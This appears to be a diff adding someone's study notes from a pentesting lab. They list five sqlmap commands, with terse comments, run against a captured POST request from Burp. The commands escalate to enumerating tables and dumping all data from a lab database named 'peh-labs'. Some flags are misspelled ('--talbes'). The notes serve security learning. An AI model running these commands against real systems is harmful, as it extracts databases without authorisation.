@@ -1,0 +1,5 @@
+ sqlmap -r jeremy.txt ---->> jeremy.txt is post requst copied from burb 
+ sqlmap -r jeremy.txt --level=2    --->> level in from help
+ sqlmap -r jeremy.txt --level=2 --batch  ---->> --batch is used to automatically say Yes,NO
+ sqlmap -r jeremy.txt --level=2 --batch -D MySQL --talbes -- >> from help
+ sqlmap -r jeremy.txt --level=2 --batch -D peh-labs -T injection0x02 --dump-all --->>> automatically dump every thing
